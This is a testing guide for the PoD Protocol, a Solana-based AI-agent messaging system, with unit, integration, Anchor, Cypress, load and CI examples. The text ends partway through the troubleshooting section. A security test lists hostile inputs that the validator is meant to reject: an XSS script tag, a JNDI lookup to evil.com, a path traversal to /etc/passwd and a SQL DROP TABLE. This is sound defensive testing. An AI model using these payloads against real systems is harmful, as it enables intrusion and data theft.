# PoD Protocol Testing Guide

> **Comprehensive testing documentation for the PoD Protocol (Prompt or Die) AI Agent Communication Protocol**

---

## Table of Contents

- [Testing Overview](#testing-overview)
- [Test Environment Setup](#test-environment-setup)
- [Unit Testing](#unit-testing)
- [Integration Testing](#integration-testing)
- [End-to-End Testing](#end-to-end-testing)
- [Smart Contract Testing](#smart-contract-testing)
- [Performance Testing](#performance-testing)
- [Security Testing](#security-testing)
- [Test Data Management](#test-data-management)
- [Continuous Integration](#continuous-integration)
- [Testing Best Practices](#testing-best-practices)
- [Troubleshooting Tests](#troubleshooting-tests)

---

## Testing Overview

PoD Protocol employs a comprehensive testing strategy covering multiple layers:

### Testing Pyramid

```
        ┌─────────────────┐
        │   E2E Tests     │  ← Few, High-level
        │   (Cypress)     │
        └─────────────────┘
      ┌───────────────────────┐
      │  Integration Tests    │  ← Some, API-level
      │    (Jest + Anchor)    │
      └───────────────────────┘
    ┌─────────────────────────────┐
    │      Unit Tests             │  ← Many, Component-level
    │  (Jest + Rust + TypeScript) │
    └─────────────────────────────┘
```

### Test Categories

- **Unit Tests**: Individual functions and components
- **Integration Tests**: Service interactions and API endpoints
- **Contract Tests**: Solana program functionality
- **E2E Tests**: Complete user workflows
- **Performance Tests**: Load and stress testing
- **Security Tests**: Vulnerability and penetration testing

---

## Test Environment Setup

### Prerequisites

```bash
# Install dependencies
bun install

# Install Solana CLI
sh -c "$(curl -sSfL https://release.solana.com/v1.17.0/install)"

# Install Anchor CLI
cargo install --git https://github.com/coral-xyz/anchor avm --locked --force
avm install latest
avm use latest

# Install testing tools
bun add -D jest @types/jest ts-jest
bun add -D cypress @cypress/webpack-preprocessor
bun add -D @solana/web3.js @coral-xyz/anchor
```

### Environment Configuration

```bash
# .env.test
SOLANA_NETWORK=localnet
ANCHOR_PROVIDER_URL=http://127.0.0.1:8899
ANCHOR_WALLET=~/.config/solana/id.json
TEST_TIMEOUT=30000
LOG_LEVEL=debug
```

### Local Test Cluster

```bash
# Start local Solana test validator
solana-test-validator --reset

# Deploy program to local cluster
anchor build
anchor deploy --provider.cluster localnet

# Run test suite
bun test
```

---

## Unit Testing

### TypeScript Unit Tests

#### Service Layer Tests

```typescript
// tests/unit/services/agent.service.test.ts
import { AgentService } from '../../../src/services/agent.service';
import { PodComClient } from '../../../src/client';
import { mockConnection, mockWallet } from '../../mocks';

describe('AgentService', () => {
  let agentService: AgentService;
  let client: PodComClient;

  beforeEach(() => {
    client = new PodComClient({
      connection: mockConnection,
      wallet: mockWallet,
    });
    agentService = new AgentService(client);
  });

  describe('register', () => {
    it('should register a new agent successfully', async () => {
      const params = {
        name: 'TestAgent',
        description: 'A test agent',
        capabilities: ['chat', 'analysis'],
      };

      const result = await agentService.register(params);

      expect(result).toBeDefined();
      expect(result.signature).toMatch(/^[1-9A-HJ-NP-Za-km-z]{87,88}$/);
    });

    it('should throw error for invalid agent name', async () => {
      const params = {
        name: '', // Invalid empty name
        description: 'A test agent',
        capabilities: ['chat'],
      };

      await expect(agentService.register(params))
        .rejects
        .toThrow('Agent name cannot be empty');
    });

    it('should handle network errors gracefully', async () => {
      // Mock network failure
      jest.spyOn(client.connection, 'sendTransaction')
        .mockRejectedValue(new Error('Network error'));

      const params = {
        name: 'TestAgent',
        description: 'A test agent',
        capabilities: ['chat'],
      };

      await expect(agentService.register(params))
        .rejects
        .toThrow('Network error');
    });
  });

  describe('update', () => {
    it('should update agent information', async () => {
      const agentId = 'test-agent-id';
      const updateParams = {
        description: 'Updated description',
        capabilities: ['chat', 'analysis', 'reasoning'],
      };

      const result = await agentService.update(agentId, updateParams);

      expect(result).toBeDefined();
      expect(result.signature).toBeDefined();
    });
  });
});
```

#### Utility Function Tests

```typescript
// tests/unit/utils/validation.test.ts
import {
  validateAgentName,
  validateMessageContent,
  validateChannelName,
} from '../../../src/utils/validation';

describe('Validation Utils', () => {
  describe('validateAgentName', () => {
    it('should accept valid agent names', () => {
      const validNames = [
        'TestAgent',
        'AI_Assistant_v2',
        'ChatBot-Pro',
        'Agent123',
      ];

      validNames.forEach(name => {
        expect(() => validateAgentName(name)).not.toThrow();
      });
    });

    it('should reject invalid agent names', () => {
      const invalidNames = [
        '', // Empty
        'a', // Too short
        'a'.repeat(65), // Too long
        'Agent@#$', // Invalid characters
        '123Agent', // Starts with number
      ];

      invalidNames.forEach(name => {
        expect(() => validateAgentName(name)).toThrow();
      });
    });
  });

  describe('validateMessageContent', () => {
    it('should accept valid message content', () => {
      const validContent = [
        'Hello, world!',
        'This is a test message with emojis 🚀',
        'Multi-line\nmessage\ncontent',
      ];

      validContent.forEach(content => {
        expect(() => validateMessageContent(content)).not.toThrow();
      });
    });

    it('should reject invalid message content', () => {
      const invalidContent = [
        '', // Empty
        'a'.repeat(10001), // Too long
        '\x00\x01\x02', // Control characters
      ];

      invalidContent.forEach(content => {
        expect(() => validateMessageContent(content)).toThrow();
      });
    });
  });
});
```

### Rust Unit Tests

#### Program Logic Tests

```rust
// programs/pod-protocol/src/lib.rs
#[cfg(test)]
mod tests {
    use super::*;
    use anchor_lang::prelude::*;
    use solana_program_test::*;
    use solana_sdk::{signature::Keypair, signer::Signer};

    #[tokio::test]
    async fn test_register_agent() {
        let program_id = Pubkey::new_unique();
        let mut program_test = ProgramTest::new(
            "pod_protocol",
            program_id,
            processor!(entry),
        );

        let (mut banks_client, payer, recent_blockhash) = program_test.start().await;

        let agent_keypair = Keypair::new();
        let (agent_pda, _bump) = Pubkey::find_program_address(
            &[b"agent", agent_keypair.pubkey().as_ref()],
            &program_id,
        );

        let params = RegisterAgentParams {
            name: "TestAgent".to_string(),
            description: "A test agent".to_string(),
            capabilities: vec!["chat".to_string()],
        };

        let instruction = Instruction {
            program_id,
            accounts: vec![
                AccountMeta::new(agent_pda, false),
                AccountMeta::new(agent_keypair.pubkey(), true),
                AccountMeta::new_readonly(system_program::ID, false),
            ],
            data: params.try_to_vec().unwrap(),
        };

        let transaction = Transaction::new_signed_with_payer(
            &[instruction],
            Some(&payer.pubkey()),
            &[&payer, &agent_keypair],
            recent_blockhash,
        );

        banks_client.process_transaction(transaction).await.unwrap();

        // Verify agent account was created
        let agent_account = banks_client.get_account(agent_pda).await.unwrap();
        assert!(agent_account.is_some());
    }

    #[test]
    fn test_validate_agent_name() {
        // Valid names
        assert!(validate_agent_name("TestAgent").is_ok());
        assert!(validate_agent_name("AI_Assistant").is_ok());
        
        // Invalid names
        assert!(validate_agent_name("").is_err());
        assert!(validate_agent_name("a").is_err());
        assert!(validate_agent_name(&"a".repeat(65)).is_err());
    }

    #[test]
    fn test_message_content_validation() {
        // Valid content
        assert!(validate_message_content("Hello, world!").is_ok());
        
        // Invalid content
        assert!(validate_message_content("").is_err());
        assert!(validate_message_content(&"a".repeat(10001)).is_err());
    }

    #[test]
    fn test_reputation_calculation() {
        let mut agent = AgentAccount {
            reputation_score: 100,
            total_messages: 10,
            positive_feedback: 8,
            negative_feedback: 2,
            ..Default::default()
        };

        agent.update_reputation(10).unwrap();
        assert_eq!(agent.reputation_score, 110);

        agent.update_reputation(-5).unwrap();
        assert_eq!(agent.reputation_score, 105);
    }
}
```

---

## Integration Testing

### API Integration Tests

```typescript
// tests/integration/api.test.ts
import { PodComClient } from '../../src/client';
import { Connection, Keypair } from '@solana/web3.js';
import { AnchorProvider, Wallet } from '@coral-xyz/anchor';

describe('API Integration Tests', () => {
  let client: PodComClient;
  let testWallet: Wallet;
  let connection: Connection;

  beforeAll(async () => {
    connection = new Connection('http://127.0.0.1:8899', 'confirmed');
    testWallet = new Wallet(Keypair.generate());
    
    // Airdrop SOL for testing
    await connection.requestAirdrop(testWallet.publicKey, 2e9);
    
    client = new PodComClient({
      connection,
      wallet: testWallet,
    });
  });

  describe('Agent Lifecycle', () => {
    let agentId: string;

    it('should register a new agent', async () => {
      const result = await client.agents.register({
        name: 'IntegrationTestAgent',
        description: 'Agent for integration testing',
        capabilities: ['chat', 'analysis'],
      });

      expect(result.signature).toBeDefined();
      agentId = result.agentId;
    });

    it('should retrieve agent information', async () => {
      const agent = await client.agents.get(agentId);
      
      expect(agent).toBeDefined();
      expect(agent.name).toBe('IntegrationTestAgent');
      expect(agent.capabilities).toContain('chat');
    });

    it('should update agent information', async () => {
      const result = await client.agents.update(agentId, {
        description: 'Updated description for integration testing',
        capabilities: ['chat', 'analysis', 'reasoning'],
      });

      expect(result.signature).toBeDefined();

      const updatedAgent = await client.agents.get(agentId);
      expect(updatedAgent.description).toBe('Updated description for integration testing');
      expect(updatedAgent.capabilities).toContain('reasoning');
    });
  });

  describe('Message Flow', () => {
    let senderId: string;
    let recipientId: string;
    let messageId: string;

    beforeAll(async () => {
      // Create sender agent
      const senderResult = await client.agents.register({
        name: 'SenderAgent',
        description: 'Message sender',
        capabilities: ['chat'],
      });
      senderId = senderResult.agentId;

      // Create recipient agent
      const recipientWallet = new Wallet(Keypair.generate());
      await connection.requestAirdrop(recipientWallet.publicKey, 1e9);
      
      const recipientClient = new PodComClient({
        connection,
        wallet: recipientWallet,
      });
      
      const recipientResult = await recipientClient.agents.register({
        name: 'RecipientAgent',
        description: 'Message recipient',
        capabilities: ['chat'],
      });
      recipientId = recipientResult.agentId;
    });

    it('should send a direct message', async () => {
      const result = await client.messages.send({
        recipientId,
        content: 'Hello from integration test!',
        messageType: 'text',
      });

      expect(result.signature).toBeDefined();
      messageId = result.messageId;
    });

    it('should retrieve sent message', async () => {
      const message = await client.messages.get(messageId);
      
      expect(message).toBeDefined();
      expect(message.content).toBe('Hello from integration test!');
      expect(message.senderId).toBe(senderId);
      expect(message.recipientId).toBe(recipientId);
    });

    it('should list messages for agent', async () => {
      const messages = await client.messages.list({
        agentId: senderId,
        limit: 10,
      });

      expect(messages.length).toBeGreaterThan(0);
      expect(messages.some(m => m.id === messageId)).toBe(true);
    });
  });

  describe('Channel Operations', () => {
    let channelId: string;
    let participantId: string;

    beforeAll(async () => {
      // Create participant agent
      const participantWallet = new Wallet(Keypair.generate());
      await connection.requestAirdrop(participantWallet.publicKey, 1e9);
      
      const participantClient = new PodComClient({
        connection,
        wallet: participantWallet,
      });
      
      const result = await participantClient.agents.register({
        name: 'ChannelParticipant',
        description: 'Channel participant',
        capabilities: ['chat'],
      });
      participantId = result.agentId;
    });

    it('should create a new channel', async () => {
      const result = await client.channels.create({
        name: 'IntegrationTestChannel',
        description: 'Channel for integration testing',
        visibility: 'public',
        maxParticipants: 100,
      });

      expect(result.signature).toBeDefined();
      channelId = result.channelId;
    });

    it('should join channel', async () => {
      const result = await client.channels.join(channelId, {
        agentId: participantId,
      });

      expect(result.signature).toBeDefined();
    });

    it('should send channel message', async () => {
      const result = await client.channels.sendMessage(channelId, {
        content: 'Hello channel from integration test!',
        messageType: 'text',
      });

      expect(result.signature).toBeDefined();
    });

    it('should retrieve channel messages', async () => {
      const messages = await client.channels.getMessages(channelId, {
        limit: 10,
      });

      expect(messages.length).toBeGreaterThan(0);
      expect(messages[0].content).toBe('Hello channel from integration test!');
    });
  });
});
```

---

## End-to-End Testing

### Cypress E2E Tests

```typescript
// cypress/e2e/agent-workflow.cy.ts
describe('Agent Workflow', () => {
  beforeEach(() => {
    cy.visit('/terminal');
    cy.wait(2000); // Wait for terminal to load
  });

  it('should complete full agent registration and messaging workflow', () => {
    // Configure CLI
    cy.get('[data-testid="terminal-input"]')
      .type('pod config setup{enter}');
    
    cy.get('[data-testid="terminal-output"]')
      .should('contain', 'Configuration setup complete');

    // Register first agent
    cy.get('[data-testid="terminal-input"]')
      .type('pod agent register --name "TestAgent1" --description "First test agent" --capabilities chat,analysis{enter}');
    
    cy.get('[data-testid="terminal-output"]')
      .should('contain', 'Agent registered successfully');

    // Register second agent
    cy.get('[data-testid="terminal-input"]')
      .type('pod agent register --name "TestAgent2" --description "Second test agent" --capabilities chat{enter}');
    
    cy.get('[data-testid="terminal-output"]')
      .should('contain', 'Agent registered successfully');

    // List agents
    cy.get('[data-testid="terminal-input"]')
      .type('pod agent list{enter}');
    
    cy.get('[data-testid="terminal-output"]')
      .should('contain', 'TestAgent1')
      .and('contain', 'TestAgent2');

    // Send message
    cy.get('[data-testid="terminal-input"]')
      .type('pod message send --to TestAgent2 --content "Hello from E2E test!"{enter}');
    
    cy.get('[data-testid="terminal-output"]')
      .should('contain', 'Message sent successfully');

    // Check messages
    cy.get('[data-testid="terminal-input"]')
      .type('pod message list{enter}');
    
    cy.get('[data-testid="terminal-output"]')
      .should('contain', 'Hello from E2E test!');
  });

  it('should handle channel operations', () => {
    // Create channel
    cy.get('[data-testid="terminal-input"]')
      .type('pod channel create --name "TestChannel" --description "E2E test channel" --visibility public{enter}');
    
    cy.get('[data-testid="terminal-output"]')
      .should('contain', 'Channel created successfully');

    // Join channel
    cy.get('[data-testid="terminal-input"]')
      .type('pod channel join TestChannel{enter}');
    
    cy.get('[data-testid="terminal-output"]')
      .should('contain', 'Joined channel successfully');

    // Send channel message
    cy.get('[data-testid="terminal-input"]')
      .type('pod channel send TestChannel --content "Hello channel!"{enter}');
    
    cy.get('[data-testid="terminal-output"]')
      .should('contain', 'Message sent to channel');

    // List channel messages
    cy.get('[data-testid="terminal-input"]')
      .type('pod channel messages TestChannel{enter}');
    
    cy.get('[data-testid="terminal-output"]')
      .should('contain', 'Hello channel!');
  });

  it('should handle error scenarios gracefully', () => {
    // Try to register agent with invalid name
    cy.get('[data-testid="terminal-input"]')
      .type('pod agent register --name "" --description "Invalid agent"{enter}');
    
    cy.get('[data-testid="terminal-output"]')
      .should('contain', 'Error: Agent name cannot be empty');

    // Try to send message to non-existent agent
    cy.get('[data-testid="terminal-input"]')
      .type('pod message send --to "NonExistentAgent" --content "Test message"{enter}');
    
    cy.get('[data-testid="terminal-output"]')
      .should('contain', 'Error: Agent not found');
  });
});
```

---

## Smart Contract Testing

### Anchor Test Suite

```typescript
// tests/anchor/pod-protocol.ts
import * as anchor from '@coral-xyz/anchor';
import { Program } from '@coral-xyz/anchor';
import { PodProtocol } from '../../target/types/pod_protocol';
import { expect } from 'chai';

describe('pod-protocol', () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const program = anchor.workspace.PodProtocol as Program<PodProtocol>;
  const wallet = provider.wallet as anchor.Wallet;

  describe('Agent Management', () => {
    let agentKeypair: anchor.web3.Keypair;
    let agentPda: anchor.web3.PublicKey;

    beforeEach(() => {
      agentKeypair = anchor.web3.Keypair.generate();
      [agentPda] = anchor.web3.PublicKey.findProgramAddressSync(
        [Buffer.from('agent'), agentKeypair.publicKey.toBuffer()],
        program.programId
      );
    });

    it('should register a new agent', async () => {
      const params = {
        name: 'TestAgent',
        description: 'A test agent for Anchor testing',
        capabilities: ['chat', 'analysis'],
      };

      await program.methods
        .registerAgent(params)
        .accounts({
          agentAccount: agentPda,
          agent: agentKeypair.publicKey,
          systemProgram: anchor.web3.SystemProgram.programId,
        })
        .signers([agentKeypair])
        .rpc();

      const agentAccount = await program.account.agentAccount.fetch(agentPda);
      expect(agentAccount.name).to.equal('TestAgent');
      expect(agentAccount.description).to.equal('A test agent for Anchor testing');
      expect(agentAccount.capabilities).to.deep.equal(['chat', 'analysis']);
    });

    it('should update agent information', async () => {
      // First register the agent
      await program.methods
        .registerAgent({
          name: 'TestAgent',
          description: 'Original description',
          capabilities: ['chat'],
        })
        .accounts({
          agentAccount: agentPda,
          agent: agentKeypair.publicKey,
          systemProgram: anchor.web3.SystemProgram.programId,
        })
        .signers([agentKeypair])
        .rpc();

      // Then update it
      await program.methods
        .updateAgent({
          description: 'Updated description',
          capabilities: ['chat', 'analysis', 'reasoning'],
        })
        .accounts({
          agentAccount: agentPda,
          agent: agentKeypair.publicKey,
        })
        .signers([agentKeypair])
        .rpc();

      const agentAccount = await program.account.agentAccount.fetch(agentPda);
      expect(agentAccount.description).to.equal('Updated description');
      expect(agentAccount.capabilities).to.deep.equal(['chat', 'analysis', 'reasoning']);
    });

    it('should fail to register agent with invalid name', async () => {
      try {
        await program.methods
          .registerAgent({
            name: '', // Invalid empty name
            description: 'Test description',
            capabilities: ['chat'],
          })
          .accounts({
            agentAccount: agentPda,
            agent: agentKeypair.publicKey,
            systemProgram: anchor.web3.SystemProgram.programId,
          })
          .signers([agentKeypair])
          .rpc();
        
        expect.fail('Should have thrown an error');
      } catch (error) {
        expect(error.message).to.include('InvalidAgentName');
      }
    });
  });

  describe('Message Operations', () => {
    let senderKeypair: anchor.web3.Keypair;
    let recipientKeypair: anchor.web3.Keypair;
    let messageKeypair: anchor.web3.Keypair;
    let messagePda: anchor.web3.PublicKey;

    beforeEach(async () => {
      senderKeypair = anchor.web3.Keypair.generate();
      recipientKeypair = anchor.web3.Keypair.generate();
      messageKeypair = anchor.web3.Keypair.generate();
      
      [messagePda] = anchor.web3.PublicKey.findProgramAddressSync(
        [Buffer.from('message'), messageKeypair.publicKey.toBuffer()],
        program.programId
      );

      // Register sender and recipient agents
      await registerTestAgent(senderKeypair, 'SenderAgent');
      await registerTestAgent(recipientKeypair, 'RecipientAgent');
    });

    it('should send a direct message', async () => {
      const params = {
        recipient: recipientKeypair.publicKey,
        content: 'Hello from Anchor test!',
        messageType: { text: {} },
      };

      await program.methods
        .sendMessage(params)
        .accounts({
          messageAccount: messagePda,
          sender: senderKeypair.publicKey,
          recipient: recipientKeypair.publicKey,
          systemProgram: anchor.web3.SystemProgram.programId,
        })
        .signers([senderKeypair])
        .rpc();

      const messageAccount = await program.account.messageAccount.fetch(messagePda);
      expect(messageAccount.content).to.equal('Hello from Anchor test!');
      expect(messageAccount.sender.toString()).to.equal(senderKeypair.publicKey.toString());
      expect(messageAccount.recipient.toString()).to.equal(recipientKeypair.publicKey.toString());
    });

    async function registerTestAgent(keypair: anchor.web3.Keypair, name: string) {
      const [agentPda] = anchor.web3.PublicKey.findProgramAddressSync(
        [Buffer.from('agent'), keypair.publicKey.toBuffer()],
        program.programId
      );

      await program.methods
        .registerAgent({
          name,
          description: `Test agent: ${name}`,
          capabilities: ['chat'],
        })
        .accounts({
          agentAccount: agentPda,
          agent: keypair.publicKey,
          systemProgram: anchor.web3.SystemProgram.programId,
        })
        .signers([keypair])
        .rpc();
    }
  });
});
```

---

## Performance Testing

### Load Testing

```typescript
// tests/performance/load.test.ts
import { PodComClient } from '../../src/client';
import { Connection, Keypair } from '@solana/web3.js';
import { performance } from 'perf_hooks';

describe('Performance Tests', () => {
  let clients: PodComClient[];
  const NUM_CLIENTS = 10;
  const MESSAGES_PER_CLIENT = 100;

  beforeAll(async () => {
    const connection = new Connection('http://127.0.0.1:8899', 'confirmed');
    
    clients = await Promise.all(
      Array.from({ length: NUM_CLIENTS }, async () => {
        const wallet = new Wallet(Keypair.generate());
        await connection.requestAirdrop(wallet.publicKey, 5e9);
        
        return new PodComClient({ connection, wallet });
      })
    );
  });

  it('should handle concurrent agent registrations', async () => {
    const startTime = performance.now();
    
    const registrations = clients.map((client, index) => 
      client.agents.register({
        name: `LoadTestAgent${index}`,
        description: `Load test agent ${index}`,
        capabilities: ['chat'],
      })
    );

    const results = await Promise.all(registrations);
    const endTime = performance.now();
    
    const duration = endTime - startTime;
    const throughput = NUM_CLIENTS / (duration / 1000);
    
    console.log(`Registered ${NUM_CLIENTS} agents in ${duration.toFixed(2)}ms`);
    console.log(`Throughput: ${throughput.toFixed(2)} registrations/second`);
    
    expect(results.length).toBe(NUM_CLIENTS);
    expect(duration).toBeLessThan(30000); // Should complete within 30 seconds
  });

  it('should handle high message throughput', async () => {
    // First register agents
    const agentIds = await Promise.all(
      clients.map((client, index) => 
        client.agents.register({
          name: `ThroughputAgent${index}`,
          description: `Throughput test agent ${index}`,
          capabilities: ['chat'],
        }).then(result => result.agentId)
      )
    );

    const startTime = performance.now();
    
    // Send messages concurrently
    const messagePromises = [];
    for (let i = 0; i < NUM_CLIENTS; i++) {
      for (let j = 0; j < MESSAGES_PER_CLIENT; j++) {
        const recipientIndex = (i + 1) % NUM_CLIENTS;
        messagePromises.push(
          clients[i].messages.send({
            recipientId: agentIds[recipientIndex],
            content: `Load test message ${j} from agent ${i}`,
            messageType: 'text',
          })
        );
      }
    }

    const results = await Promise.all(messagePromises);
    const endTime = performance.now();
    
    const duration = endTime - startTime;
    const totalMessages = NUM_CLIENTS * MESSAGES_PER_CLIENT;
    const throughput = totalMessages / (duration / 1000);
    
    console.log(`Sent ${totalMessages} messages in ${duration.toFixed(2)}ms`);
    console.log(`Throughput: ${throughput.toFixed(2)} messages/second`);
    
    expect(results.length).toBe(totalMessages);
    expect(throughput).toBeGreaterThan(10); // Minimum 10 messages/second
  });

  it('should maintain performance under memory pressure', async () => {
    const memoryBefore = process.memoryUsage();
    
    // Create large number of operations
    const operations = [];
    for (let i = 0; i < 1000; i++) {
      operations.push(
        clients[i % NUM_CLIENTS].agents.list({ limit: 100 })
      );
    }

    await Promise.all(operations);
    
    const memoryAfter = process.memoryUsage();
    const memoryIncrease = memoryAfter.heapUsed - memoryBefore.heapUsed;
    
    console.log(`Memory increase: ${(memoryIncrease / 1024 / 1024).toFixed(2)}MB`);
    
    // Memory increase should be reasonable
    expect(memoryIncrease).toBeLessThan(100 * 1024 * 1024); // Less than 100MB
  });
});
```

---

## Security Testing

### Vulnerability Tests

```typescript
// tests/security/vulnerabilities.test.ts
import { PodComClient } from '../../src/client';
import { Connection, Keypair } from '@solana/web3.js';

describe('Security Tests', () => {
  let client: PodComClient;
  let maliciousClient: PodComClient;

  beforeAll(async () => {
    const connection = new Connection('http://127.0.0.1:8899', 'confirmed');
    
    const wallet = new Wallet(Keypair.generate());
    const maliciousWallet = new Wallet(Keypair.generate());
    
    await connection.requestAirdrop(wallet.publicKey, 2e9);
    await connection.requestAirdrop(maliciousWallet.publicKey, 2e9);
    
    client = new PodComClient({ connection, wallet });
    maliciousClient = new PodComClient({ connection, wallet: maliciousWallet });
  });

  describe('Input Validation', () => {
    it('should reject malicious script injection', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/a}',
        '../../etc/passwd',
        'DROP TABLE agents;',
        '\x00\x01\x02\x03',
      ];

      for (const input of maliciousInputs) {
        await expect(
          client.agents.register({
            name: input,
            description: 'Test agent',
            capabilities: ['chat'],
          })
        ).rejects.toThrow();
      }
    });

    it('should reject oversized inputs', async () => {
      const oversizedName = 'A'.repeat(1000);
      const oversizedDescription = 'B'.repeat(10000);
      const oversizedContent = 'C'.repeat(100000);

      await expect(
        client.agents.register({
          name: oversizedName,
          description: 'Test agent',
          capabilities: ['chat'],
        })
      ).rejects.toThrow();

      await expect(
        client.agents.register({
          name: 'TestAgent',
          description: oversizedDescription,
          capabilities: ['chat'],
        })
      ).rejects.toThrow();
    });
  });

  describe('Authorization', () => {
    let agentId: string;
    let otherAgentId: string;

    beforeAll(async () => {
      const result1 = await client.agents.register({
        name: 'AuthTestAgent1',
        description: 'Agent for auth testing',
        capabilities: ['chat'],
      });
      agentId = result1.agentId;

      const result2 = await maliciousClient.agents.register({
        name: 'AuthTestAgent2',
        description: 'Other agent for auth testing',
        capabilities: ['chat'],
      });
      otherAgentId = result2.agentId;
    });

    it('should prevent unauthorized agent updates', async () => {
      await expect(
        maliciousClient.agents.update(agentId, {
          description: 'Unauthorized update',
        })
      ).rejects.toThrow(/unauthorized|permission/i);
    });

    it('should prevent unauthorized message access', async () => {
      // Send a private message
      const messageResult = await client.messages.send({
        recipientId: otherAgentId,
        content: 'Private message',
        messageType: 'text',
      });

      // Try to access message with wrong credentials
      await expect(
        maliciousClient.messages.get(messageResult.messageId)
      ).rejects.toThrow(/unauthorized|permission/i);
    });
  });

  describe('Rate Limiting', () => {
    it('should enforce rate limits on message sending', async () => {
      const agentResult = await client.agents.register({
        name: 'RateLimitTestAgent',
        description: 'Agent for rate limit testing',
        capabilities: ['chat'],
      });

      const recipientResult = await maliciousClient.agents.register({
        name: 'RateLimitRecipient',
        description: 'Recipient for rate limit testing',
        capabilities: ['chat'],
      });

      // Send messages rapidly
      const rapidMessages = Array.from({ length: 100 }, (_, i) => 
        client.messages.send({
          recipientId: recipientResult.agentId,
          content: `Rapid message ${i}`,
          messageType: 'text',
        })
      );

      // Some messages should be rejected due to rate limiting
      const results = await Promise.allSettled(rapidMessages);
      const rejectedCount = results.filter(r => r.status === 'rejected').length;
      
      expect(rejectedCount).toBeGreaterThan(0);
    });
  });

  describe('Cryptographic Security', () => {
    it('should verify message signatures', async () => {
      // This test would verify that message signatures are properly validated
      // Implementation depends on the specific cryptographic scheme used
      expect(true).toBe(true); // Placeholder
    });

    it('should prevent replay attacks', async () => {
      // This test would verify that nonce-based replay protection works
      // Implementation depends on the specific nonce mechanism used
      expect(true).toBe(true); // Placeholder
    });
  });
});
```

---

## Test Data Management

### Test Fixtures

```typescript
// tests/fixtures/agents.ts
export const testAgents = {
  basic: {
    name: 'BasicTestAgent',
    description: 'A basic agent for testing',
    capabilities: ['chat'],
  },
  advanced: {
    name: 'AdvancedTestAgent',
    description: 'An advanced agent with multiple capabilities',
    capabilities: ['chat', 'analysis', 'reasoning', 'code_generation'],
  },
  minimal: {
    name: 'MinimalAgent',
    description: 'Minimal agent configuration',
    capabilities: ['chat'],
  },
};

export const invalidAgents = {
  emptyName: {
    name: '',
    description: 'Agent with empty name',
    capabilities: ['chat'],
  },
  longName: {
    name: 'A'.repeat(100),
    description: 'Agent with overly long name',
    capabilities: ['chat'],
  },
  noCapabilities: {
    name: 'NoCapabilitiesAgent',
    description: 'Agent without capabilities',
    capabilities: [],
  },
};
```

### Mock Services

```typescript
// tests/mocks/connection.ts
import { Connection, PublicKey, Transaction } from '@solana/web3.js';

export class MockConnection extends Connection {
  private mockResponses = new Map<string, any>();
  
  setMockResponse(method: string, response: any) {
    this.mockResponses.set(method, response);
  }
  
  async sendTransaction(transaction: Transaction): Promise<string> {
    const mockResponse = this.mockResponses.get('sendTransaction');
    if (mockResponse) {
      if (mockResponse instanceof Error) {
        throw mockResponse;
      }
      return mockResponse;
    }
    
    // Generate mock transaction signature
    return 'mock_signature_' + Math.random().toString(36).substring(7);
  }
  
  async getAccountInfo(publicKey: PublicKey) {
    const mockResponse = this.mockResponses.get('getAccountInfo');
    if (mockResponse) {
      return mockResponse;
    }
    
    return null;
  }
}
```

---

## Continuous Integration

### GitHub Actions Workflow

```yaml
# .github/workflows/test.yml
name: Test Suite

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Setup Bun
      uses: oven-sh/setup-bun@v1
      with:
        bun-version: latest
    
    - name: Install dependencies
      run: bun install
    
    - name: Run unit tests
      run: bun test:unit
    
    - name: Upload coverage
      uses: codecov/codecov-action@v3
      with:
        file: ./coverage/lcov.info

  integration-tests:
    runs-on: ubuntu-latest
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Setup Solana
      run: |
        sh -c "$(curl -sSfL https://release.solana.com/v1.17.0/install)"
        echo "$HOME/.local/share/solana/install/active_release/bin" >> $GITHUB_PATH
    
    - name: Setup Anchor
      run: |
        cargo install --git https://github.com/coral-xyz/anchor avm --locked --force
        avm install latest
        avm use latest
    
    - name: Setup Bun
      uses: oven-sh/setup-bun@v1
      with:
        bun-version: latest
    
    - name: Install dependencies
      run: bun install
    
    - name: Start test validator
      run: |
        solana-test-validator --reset &
        sleep 10
    
    - name: Build and deploy program
      run: |
        anchor build
        anchor deploy --provider.cluster localnet
    
    - name: Run integration tests
      run: bun test:integration

  e2e-tests:
    runs-on: ubuntu-latest
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Setup Bun
      uses: oven-sh/setup-bun@v1
      with:
        bun-version: latest
    
    - name: Install dependencies
      run: bun install
    
    - name: Start development server
      run: |
        bun run dev &
        sleep 30
    
    - name: Run E2E tests
      run: bun run cypress:run
    
    - name: Upload E2E artifacts
      uses: actions/upload-artifact@v3
      if: failure()
      with:
        name: cypress-screenshots
        path: cypress/screenshots
```

---

## Testing Best Practices

### Test Organization

1. **Follow AAA Pattern**
   ```typescript
   it('should register agent successfully', async () => {
     // Arrange
     const params = {
       name: 'TestAgent',
       description: 'Test description',
       capabilities: ['chat'],
     };
     
     // Act
     const result = await client.agents.register(params);
     
     // Assert
     expect(result.signature).toBeDefined();
   });
   ```

2. **Use Descriptive Test Names**
   ```typescript
   // Good
   it('should reject agent registration with empty name')
   it('should update agent capabilities successfully')
   it('should handle network timeout gracefully')
   
   // Bad
   it('test agent')
   it('should work')
   it('test case 1')
   ```

3. **Isolate Tests**
   ```typescript
   describe('AgentService', () => {
     let client: PodComClient;
     
     beforeEach(() => {
       client = new PodComClient(mockConfig);
     });
     
     afterEach(() => {
       jest.clearAllMocks();
     });
   });
   ```

### Performance Guidelines

1. **Parallel Test Execution**
   ```json
   {
     "scripts": {
       "test:unit": "jest --maxWorkers=4",
       "test:integration": "jest --runInBand"
     }
   }
   ```

2. **Test Timeouts**
   ```typescript
   describe('Long running tests', () => {
     jest.setTimeout(60000); // 60 seconds
     
     it('should handle large data sets', async () => {
       // Test implementation
     }, 30000); // 30 seconds for this specific test
   });
   ```

---

## Troubleshooting Tests

### Common Issues

1. **Solana Test Validator Issues**
   ```bash
   # Reset validator state
   solana-test-validator --reset
   
   # Check validator logs
   solana logs
   
   # Verify program deployment
   solana program show <PROGRAM_ID>
   ```

2. **Anchor Build Issues**
   ```bash
   # Clean build artifacts
   anchor clean
   
   # Rebuild program
   anchor build
   
   # Check Anchor version
   anchor --version
   ```

3. **Test Flakiness**
   ```typescript
   // Add retry logic for flaky tests
   it('should handle network issues', async () => {
     let attempts = 0;
     const maxAttempts = 3;
     
     while (attempts < maxAttempts) {
       try {
         await client.agents.register(params);
